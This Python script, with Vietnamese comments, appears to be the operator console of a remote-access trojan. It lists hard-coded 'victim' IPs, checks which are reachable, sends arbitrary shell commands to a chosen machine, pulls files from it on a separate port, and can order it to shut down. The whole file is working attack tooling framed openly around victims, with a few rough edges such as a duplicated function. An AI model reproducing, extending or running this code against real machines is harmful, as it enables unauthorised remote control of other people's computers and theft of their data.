# -*- coding: utf-8 -*-
"""
Created on Dec 23 2020

@autor Tiz
"""

import socket
import threading
import os


all_connections = []
all_addresses = ['10.10.27.51', '10.0.2.15', '192.168.1.112'] 


def check_victim_status(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((ip, port))
        s.close()
        return True  
    except:
        return False 


def display_victims():
    print("\n---- List of Victims ----")
    victims_status = []
    for i, ip in enumerate(all_addresses):
        status = "Có thể kết nối" if check_victim_status(ip, 5000) else "Không thể kết nối"
        victims_status.append(status)
        print(f"{i}. {ip} - {status}")
    print("----------------------------")
    return victims_status


def choose_victim(victims_status):
    while True:
        try:
            choice = int(input("\nSelect the victim index: "))
            if choice < len(all_addresses) and victims_status[choice] == "Có thể kết nối":
                return all_addresses[choice]
            else:
                print("Invalid selection or victim cannot be connected!")
        except ValueError:
            print("Please enter a valid number!")


def handle_victim(ip, port):
    conn = None
    try:
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.settimeout(120)
        conn.connect((ip, port))
        print(f"Connected to {ip}")
        
        while True:
            command = input(f"Enter command for {ip} (or 'exit' to disconnect, 'switch' to choose another victim): ")
            if command.lower() == "exit":
                print(f"Disconnected from {ip}.")
                run_victim_manager()
                break
            elif command.lower() == "switch":
                print(f"Switching from {ip} to choose another victim.")
                run_victim_manager()

            elif command.lower() == "send_file":
                receive_file(ip, 5003)  # Thay vì conn, truyền địa chỉ IP của nạn nhân và port
                break

            if not command.strip():
                print("Please enter a valid command.")
                continue
            
            # Gửi lệnh và nhận phản hồi
            conn.send(command.encode())
            response = conn.recv(1024).decode()
            print(f"Response from {ip}: {response}")
            if command.lower()== "shutdown /s /t 0":
                print(f" Disconnected with victim {ip} ")
                break

    except socket.timeout:
        print("Connection timed out. Please check the victim's status.")
    except ConnectionRefusedError:
        print("Connection refused. Is the victim running the server?")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        if conn:
            conn.close()
            run_victim_manager()


# Nhận file từ nạn nhân
def receive_file(host, port, save_directory='received_files'):
    # Create the directory if it doesn't exist
    if not os.path.exists(save_directory):
        os.makedirs(save_directory)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen()
        print(f"Listening for files on {host}:{port}")
        conn, addr = s.accept()
        with conn:
            print(f"Connected by {addr}")
            while True:
                try:
                    # Receive and decode the file metadata (name and size)
                    file_info = conn.recv(1024).strip().decode('utf-8')
                    if not file_info:
                        print("No more file info received.")
                        break

                    # Split the received info into file name and file size
                    filename, filesize = file_info.split('|')
                    filesize = int(filesize)
                    print(f"Receiving {filename} with size {filesize} bytes")

                    # Save the file in the specified directory
                    filepath = os.path.join(save_directory, filename)
                    with open(filepath, 'wb') as f:
                        remaining = filesize
                        while remaining > 0:
                            chunk_size = 4096 if remaining >= 4096 else remaining
                            chunk = conn.recv(chunk_size)
                            if not chunk:
                                break
                            f.write(chunk)
                            remaining -= len(chunk)
                        print(f"Received {filename} successfully! Saved to {filepath}")
                except Exception as e:
                    print(f"Error receiving file: {e}")
                    break

def verify_file(filepath, expected_size):
    if os.path.exists(filepath):
        actual_size = os.path.getsize(filepath)
        if actual_size == expected_size:
            print("Tệp đã được nhận đầy đủ và chính xác.")
        else:
            print(f"Tệp bị lỗi: kích thước thực tế ({actual_size}) không khớp với kích thước dự kiến ({expected_size}).")
    else:
        print("Tệp không tồn tại.")
# Kiểm tra trạng thái kết nối của máy nạn nhân
def check_victim_status(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)  # Thay đổi thời gian chờ
        s.connect((ip, port))
        s.close()
        return True  # Kết nối thành công
    except:
        return False  # Kết nối thất bại

# Chạy server và kiểm tra trạng thái các nạn nhân
def run_victim_manager():
    victims_status = display_victims()

    victim_ip = choose_victim(victims_status)
    if victim_ip:
        if check_victim_status(victim_ip, 5000):  # Kiểm tra trạng thái trước khi kết nối
            handle_victim(victim_ip, 5000)
        else:
            print(f"Cannot connect to {victim_ip}. Please check the victim's status.")

if __name__ == '__main__':
    run_victim_manager()

   